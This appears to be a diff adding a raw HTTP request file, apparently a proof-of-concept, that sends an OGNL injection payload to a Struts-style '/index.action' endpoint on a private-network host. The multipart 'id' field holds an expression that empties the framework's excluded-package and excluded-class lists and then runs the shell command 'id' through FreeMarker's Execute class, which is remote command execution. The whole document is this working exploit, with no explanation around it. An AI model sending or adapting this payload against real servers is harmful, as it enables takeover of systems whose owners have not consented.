@@ -1,0 +1,25 @@
+POST /index.action HTTP/1.1
+Host: 192.168.1.14:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Length: 1361
+
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF
+Content-Disposition: form-data; name="id"
+
+%{
+(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + 
+(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + 
+(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +
+(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + 
+(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + 
+(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + 
+(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + 
+(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +
+(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))
+}
+------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
